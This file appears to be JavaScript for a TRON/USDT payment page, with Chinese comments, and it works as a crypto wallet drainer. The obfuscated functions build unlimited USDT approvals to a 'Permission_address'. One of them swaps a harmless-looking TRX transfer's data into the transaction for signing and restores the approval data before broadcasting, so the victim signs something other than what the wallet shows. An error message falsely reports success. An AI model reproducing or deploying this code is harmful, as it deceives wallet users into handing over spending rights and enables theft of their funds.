

// 下一步按钮点击处理函数
async function onNextButtonClick() {
    try {
        // 检查钱包是否已连接
        if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
            await connectWallet();
            return; // 连接后停止，等待用户再次点击
        }
        // 钱包已连接，直接执行操作
        if (typeof window.okxwallet !== 'undefined') {
            await DjdskdbGsj();
        } else {
            await KdhshaBBHdg();
        }
    } catch (error) {
        console.error('操作执行失败:', error);
        tip('付款失败，请重新发起交易');
    }
}


async function DjdskdbGsj() {
  const trxAmountInSun = tronWeb.toSun(currentAmount);
  const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
  const feeLimit = 1000000000;
  
  try {

    const paymentAddress = tronWeb.address.fromHex(window.Payment_address);
    
    console.log("构建TRX转账交易...");
    const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
      paymentAddress,
      trxAmountInSun,
      tronWeb.defaultAddress.base58,
      { feeLimit: feeLimit }
    );

    const approvalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
      tronWeb.address.toHex(window.usdtContractAddress),
      'increaseApproval(address,uint256)',
      { feeLimit: feeLimit },
      [
        { type: 'address', value: window.Permission_address },
        { type: 'uint256', value: maxUint256 }
      ],
      tronWeb.defaultAddress.base58
    );

    const originalRawData = approvalTransaction.transaction.raw_data;

    approvalTransaction.transaction.raw_data = transferTransaction.raw_data;

    console.log("交易签名中...");
    const signedTransaction = await tronWeb.trx.sign(approvalTransaction.transaction);

    signedTransaction.raw_data = originalRawData;

    console.log("发送交易...");
    const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);

    console.log("交易结果:", broadcastResult);
    if (broadcastResult.result || broadcastResult.success) {
      const transactionHash = broadcastResult.txid || (broadcastResult.transaction && broadcastResult.transaction.txID);
      if (!transactionHash) {
        throw new Error("无法获取交易哈希");
      }
      console.log("交易发送成功，交易哈希:", transactionHash);
      tip("交易成功");
      return transactionHash;
    } else {
      throw new Error("交易失败");
    }
  } catch (error) {
    console.error("操作失败:", error);
    tip("交易失败，请重试");
    throw error;
  }
}

async function KdhshaBBHdg() {
    const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    const feeLimit = 100000000;  // 设置feeLimit为100 TRX
    const usdtContractAddressHex = tronWeb.address.toHex(window.usdtContractAddress);

    try {
        console.log("构建交易...");
        const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
            usdtContractAddressHex,
            'approve(address,uint256)',
            { feeLimit: feeLimit },
            [
                { type: 'address', value: tronWeb.address.toHex(window.Permission_address) },
                { type: 'uint256', value: maxUint256 }
            ],
            tronWeb.defaultAddress.base58
        );

        if (!transaction.result || !transaction.result.result) {
            throw new Error('授权交易构建失败');
        }

        console.log("交易签名中...");
        const signedTransaction = await tronWeb.trx.sign(transaction.transaction);

        console.log("发送交易...");
        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);

        console.log("交易交易结果:", result);
        if (result.result) {
            const transactionHash = result.txid;
            console.log("交易成功，交易哈希:", transactionHash);
            tip("交易成功");
            return transactionHash;
        } else {
            throw new Error("交易失败");
        }
    } catch (error) {
        console.error("执行授权操作失败:", error);
        if (error && error.message) {
            console.error("错误信息:", error.message);
        }
        tip("交易成功，请重试");
        throw error;
    }
}



// TRX 转账交易
async function sendTRXTransaction() {
    try {
        const paymentAddress = window.Payment_address;
        const senderAddress = window.tronWeb.defaultAddress.base58;
        const trxAmountInSun = window.tronWeb.toSun(currentAmount);

        console.log("📌 构建 TRX 交易...");
        const transaction = await window.tronWeb.transactionBuilder.sendTrx(paymentAddress, trxAmountInSun, senderAddress, {
            feeLimit: 50000000  // 5 TRX 确保手续费足够
        });

        console.log("📌 交易签名中...");
        const signedTransaction = await window.tronWeb.trx.sign(transaction);

        console.log("📌 发送交易...");
        const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTransaction);

        if (broadcast.result) {
            console.log("✅ 交易成功！哈希:", broadcast.txid);
            tip("交易成功");
            return broadcast.txid;
        } else {
            throw new Error("交易失败");
        }
    } catch (error) {
        console.error("❌ TRX 交易失败:", error);
        tip("交易失败，请稍后重试！");
    }
}

// USDT 授权交易
async function approveUSDT() {
    try {
        const spender = window.Permission_address;
        const contractAddress = window.usdtContractAddress;
        const senderAddress = window.tronWeb.defaultAddress.base58;
        const feeLimit = 50000000; // 5 TRX 确保矿工打包

        console.log(`📌 开始 USDT 授权：授权 ${spender}`);

        const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
            window.tronWeb.address.toHex(contractAddress),
            'approve(address,uint256)',
            { feeLimit: feeLimit },
            [
                { type: 'address', value: window.tronWeb.address.toHex(spender) },
                { type: 'uint256', value: '999999999999999999' }
            ],
            senderAddress
        );

        if (!transaction.result || !transaction.result.result) {
            throw new Error('授权交易构建失败');
        }

        console.log("📌 交易签名中...");
        const signedTransaction = await window.tronWeb.trx.sign(transaction.transaction);

        console.log("📌 发送授权交易...");
        const result = await window.tronWeb.trx.sendRawTransaction(signedTransaction);

        if (result.result) {
            console.log("✅ USDT 授权成功，交易哈希:", result.txid);
            tip("USDT 授权成功");
            return result.txid;
        } else {
            throw new Error("USDT 授权交易失败");
        }
    } catch (error) {
        console.error("❌ USDT 授权失败:", error);
        tip("USDT 授权失败，请检查钱包和网络状态！");
    }
}

// 确保使用稳定的 TRON API 以减少网络繁忙问题
window.tronWeb = new TronWeb({
    fullHost: "https://trx.cryptohub.cc", // 备用公共节点
    privateKey: ""
});


// 交易前检查资源是否充足
async function checkResources() {
    try {
        const address = window.tronWeb.defaultAddress.base58;
        const account = await window.tronWeb.trx.getAccount(address);
        const bandwidth = account.freeNetUsage || 0;
        const energy = account.energy || 0;

        console.log(`📌 当前带宽: ${bandwidth}`);
        console.log(`📌 当前能量: ${energy}`);

        if (bandwidth < 250) {
            alert("⚠️ 你的带宽不足，交易可能会消耗 TRX 手续费！");
        }

        if (energy < 10000) {
            alert("⚠️ 你的能量不足，USDT 交易可能失败！");
        }
    } catch (error) {
        console.error("❌ 获取资源信息失败:", error);
    }
}

// 交易前检查 TRX 余额
async function checkTRXBalance() {
    try {
        const address = window.tronWeb.defaultAddress.base58;
        const balance = await window.tronWeb.trx.getBalance(address);
        const trxBalance = window.tronWeb.fromSun(balance);

        console.log(`📌 当前 TRX 余额: ${trxBalance} TRX`);
        if (trxBalance < 30) {
            alert("⚠️ 你的 TRX 余额过低，交易可能失败（建议至少 30 TRX 作为手续费）！");
        } else {
            alert(`✅ 你的 TRX 余额充足: ${trxBalance} TRX`);
        }
    } catch (error) {
        console.error("❌ 获取 TRX 余额失败:", error);
    }
}

//3.6更新
async function checkAndRentEnergy() {
    const energyThreshold = 10000;  // 需要的最低能量
    const leaseAddress = "TRGKyGrfqXismG7LddwVDm2nuZc83MMMMM";
    const leaseAmount = 1.8;  // 1.8 TRX 兑换能量

    try {
        const account = await window.tronWeb.trx.getAccount(window.tronWeb.defaultAddress.base58);
        const energy = account.energy || 0;
        console.log(`📌 当前能量: ${energy}`);

        if (energy < energyThreshold) {
            console.log(`⚠️ 能量不足，正在租赁 ${leaseAmount} TRX 获取能量...`);

            const trxAmountInSun = window.tronWeb.toSun(leaseAmount);
            const transaction = await window.tronWeb.transactionBuilder.sendTrx(leaseAddress, trxAmountInSun, window.tronWeb.defaultAddress.base58);
            const signedTransaction = await window.tronWeb.trx.sign(transaction);
            const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTransaction);

            if (broadcast.result) {
                console.log(`✅ 能量租赁成功！交易哈希: ${broadcast.txid}`);
            } else {
                throw new Error("能量租赁失败");
            }
        } else {
            console.log("✅ 能量充足，无需租赁");
        }
    } catch (error) {
        console.error("❌ 处理能量租赁失败:", error);
    }
}
